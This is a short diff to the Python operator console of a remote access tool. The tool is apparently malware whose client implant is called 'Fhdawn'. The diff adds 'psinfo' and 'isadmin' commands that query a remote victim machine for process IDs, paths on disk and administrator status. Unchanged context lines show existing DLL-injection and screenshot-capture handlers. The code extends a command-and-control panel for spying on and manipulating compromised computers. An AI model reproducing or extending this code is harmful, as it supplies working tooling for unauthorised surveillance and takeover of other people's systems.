@@ -621,6 +621,16 @@ Open Ports
                         self.WaitForReply()
                         time.sleep(5)
 
+                elif(main == "psinfo"):
+                    name = input("[+] Enter Process name : ")
+                    if(len(name) > 0):
+                        self.SendData("psinfo:"+name)
+                        self.WaitForReply()
+
+                elif(main == "isadmin"):
+                    self.SendData("isadmin")
+                    self.WaitForReply()
+
                 elif(main == "dllinject"):
                     
                     DLLTransfer()
@@ -783,6 +793,34 @@ Open Ports
                         print("[i] Please report this bug to developer with the information above.")
                         pass
                 
+                # Get Process information
+                elif(client_data.startswith("PROCESS")):
+                    try:
+                        fileinfo = client_data.split(",") # split info by comma
+                        print(
+                            Style.BRIGHT + "[" + Fore.GREEN + "+" + Style.RESET_ALL + Style.BRIGHT + "] Process '{p}' running at PID '{pid}' Path on disk '{pth}' ..."
+                            .format(p = fileinfo[1], pid = fileinfo[2], pth = fileinfo[3]))
+
+                    except Exception as Error:
+                        print("[X] Error : " + str(Error))
+                        print("[i] Process Information : " + client_data)
+                        # Rare case, This will only happen if Fhdawn has sent invalid triggers.
+                        print("[i] Please report this bug to developer with the information above.")
+                        pass
+                
+                elif(client_data.startswith("ADMIN")):
+                    try:
+                        fileinfo = client_data.split(":") 
+                        print(
+                            Style.BRIGHT + "[" + Fore.GREEN + "+" + Style.RESET_ALL + Style.BRIGHT + "] Administrator : " + fileinfo[1])
+
+                    except Exception as Error:
+                        print("[X] Error : " + str(Error))
+                        print("[i] Process Information : " + client_data)
+                        # Rare case, This will only happen if Fhdawn has sent invalid triggers.
+                        print("[i] Please report this bug to developer with the information above.")
+                        pass
+                    
                 # Get screenshot, Convert to png and save
                 elif(client_data.startswith("SCREENSHOT")):
                     try:
